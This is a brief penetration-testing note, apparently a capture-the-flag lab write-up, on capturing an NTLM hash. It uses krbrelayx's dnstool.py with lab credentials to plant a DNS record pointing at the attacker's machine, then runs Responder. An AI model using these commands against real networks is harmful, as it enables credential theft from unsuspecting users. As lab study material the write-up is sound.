
When an process/script is discovered which authenticates against an service like LDAP, and we are somehow able to connect the authentication against our machine we can utilize Krbrelayx's tool to intercept an NTLM Hash.

---
## Capture Hash

dnstool.py is a script that comes with Krbrelayx that can add, modify & delete DNS Entries to the target LDAP Service.

1. Let's add an DNS Entry.

```
python3 /opt/arsenal/krbrelayx/dnstool.py -u 'intelligence\tiffany.molina' -p 'NewIntelligenceCorpUser9876' -r web2000.intelligence.htb -a add -t A -d 10.10.15.9 10.129.95.154
```

2. Start up responder on local machine.

```
responder -I tun0
```

After a couple of minutes we retrieved the NTLM Hash of an user.